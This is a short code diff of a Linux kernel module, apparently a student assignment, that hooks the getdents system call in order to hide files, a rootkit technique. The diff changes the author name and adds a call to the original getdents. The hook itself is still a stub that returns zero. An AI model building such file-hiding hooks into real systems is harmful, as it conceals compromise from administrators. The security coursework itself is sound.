@@ -12,13 +12,14 @@
 #include <linux/types.h>  /* size_t */
 #include "tesla.h"
 
-MODULE_AUTHOR("Jidong Xiao"); /* change this line to your name */
+MODULE_AUTHOR("Mario Torres");
 MODULE_LICENSE("GPL v2");
 
 /* asmlinkage tells gcc that function parameters will not be in registers, but rather they will be in the stack. */
 /* we intercept getdents so as to hide specific files. */
 asmlinkage long tesla_getdents(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count)
 {
+  int totalSize = orig_getdents(fd, dirp, count);
     return 0;
 }
 
